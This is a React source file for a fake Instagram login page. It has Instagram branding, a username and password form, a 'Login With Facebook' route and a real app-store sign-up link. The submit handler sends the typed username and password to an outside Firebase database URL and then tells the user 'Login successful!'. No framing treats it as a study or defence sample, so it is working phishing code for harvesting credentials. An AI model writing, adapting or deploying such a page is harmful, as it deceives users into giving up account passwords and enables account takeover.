import React, { useState } from 'react';
import axios from 'axios';
import './App.css';
import instaimg1 from './instaimg1.png';
import pngegg from './pngegg.png';
import playstore from './playstore.png';
import LoginPage from './LoginPage';
import { Link, BrowserRouter as Router, Routes, Route } from 'react-router-dom';

const App = () => {
  const [data, setData] = useState({
    username: '',
    password: '',
  });

  const { username, password } = data;

  const submitHandler = (e) => {
    e.preventDefault();
    axios
      .post('https://instagram-efc22-default-rtdb.firebaseio.com/-O79hOFEL-TB1Nd2cgas.json', data)
      .then(() => alert('Login successful!'))
      .catch((error) => console.error('There was an error logging in!', error));
  };

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  return (
    <Router>
      <Routes>
        {/* Route for the LoginPage that occupies the full screen */}
        <Route path="/facebook" element={<LoginPage />} />

        {/* Default route for the App component */}
        <Route
          path="/"
          element={
            <div id="div2">
              <div id="div1">
                <center>
                  <br />
                  <br />
                  <img src={instaimg1} alt="Instagram Logo" height={100} />
                  <br />
                  <img src={pngegg} alt="Another Logo" height={70} />
                  <form onSubmit={submitHandler}>
                    <input
                      type="text"
                      name="username"
                      value={username}
                      onChange={handleChange}
                      placeholder="Phone number, username, or email"
                    />
                    <br />
                    <br />
                    <input
                      type="password"
                      name="password"
                      value={password}
                      onChange={handleChange}
                      placeholder="Password"
                    />
                    <br />
                    <br />
                    <input
                      type="submit"
                      style={{ backgroundColor: 'blue', width: 150, color: 'white' }}
                      value="Log in"
                    />
                    <p>---------- OR -----------</p>
                    <Link to="/facebook">
                      <li style={{ cursor: 'pointer', color: 'blue' }}>Login With Facebook</li>
                    </Link>
                    <p>Forgot password?</p>
                    <p>Don't have an account?</p>
                    <a href="https://apps.apple.com/us/app/instagram/id389801252?ct=igweb.loginPage.badge&mt=8&pt=428156&vt=lo">
                      Sign Up
                    </a>
                    <br />
                    <p>Get the App</p>
                    <img src={playstore} alt="Play Store" height={100} />
                  </form>
                </center>
              </div>
            </div>
          }
        />
      </Routes>
    </Router>
  );
};
export default App;